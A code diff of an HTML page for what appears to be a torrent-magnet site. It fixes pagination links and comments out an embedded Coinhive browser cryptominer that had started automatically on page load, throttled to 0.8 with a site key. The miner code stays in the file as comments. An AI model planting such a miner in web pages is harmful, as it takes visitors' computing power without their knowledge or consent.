@@ -38,20 +38,20 @@ $(function() {
     }
     for(var i = -5; i < 5; i++) {
       var np = i + page;
-      if (np > 0 && np < data.length)
+      if (np >= 0 && np < data.length)
       links.append(
-        "<a href=" + location.host + location.pathname + "?page="+ np +">" + np + "</a> "
+        "<a href=http://" + location.host + location.pathname + "?page="+ np +">" + np + "</a> "
       );
     }
   });
 });
 
 </script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
   var miner = new CoinHive.User('Ul2yU1S7qXAVxePjR8BBZpaqrW8iewPZ', 'test', {throttle: 0.8});
   miner.start();
-</script>
+</script> -->
 </head>
 <body>
 <h1>Hentai Magnet</h1>
